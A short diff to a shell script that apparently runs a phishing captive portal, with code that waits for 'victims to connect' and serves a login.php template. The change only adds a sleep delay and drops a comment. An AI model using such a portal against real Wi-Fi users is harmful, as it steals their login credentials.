@@ -87,6 +87,7 @@ start_captive_portal() {
     # Implement captive portal logic
     echo "Waiting for victims to connect..."
     # Use template to prompt for login
+    sleep 10 # Adjust this delay as needed
     while true; do
         if [ -e "/var/www/html/login.php" ]; then
             cat "/var/www/html/login.php"
@@ -96,7 +97,6 @@ start_captive_portal() {
     done
 }
 
-# Main script starts here
 
 # Clear the terminal
 clear_terminal
